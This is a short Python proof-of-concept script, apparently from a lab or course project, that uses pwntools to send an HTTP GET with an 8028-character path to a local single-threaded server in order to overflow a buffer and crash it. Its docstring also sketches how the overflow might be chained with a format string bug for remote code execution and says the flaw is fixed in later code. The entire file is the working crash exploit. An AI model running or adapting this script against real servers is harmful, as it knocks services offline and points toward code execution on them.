'''
A simple script to exploit buffer overflow in the given single threaded server. This
script will cause the server to crash.

Since the stack canary is turned on by default, the buffer overflow will change
the stack canary causing the server to detect an overflow. If somehow an attacker can
get the server binary and if there is a format string vulnerability, he can combine the 
two to get remote code execution.

The buffer overflow is mitigated in the latest code by using bound on variables.
'''

from pwn import remote

host = "127.0.0.1"
port = 8081

r = remote(host, port)

# offset for buffer overflow
uri = "/" + "A"*8028    

r.sendline("GET {} HTTP/1.1".format(uri))
r.sendline(b"\r\n")

r.interactive()
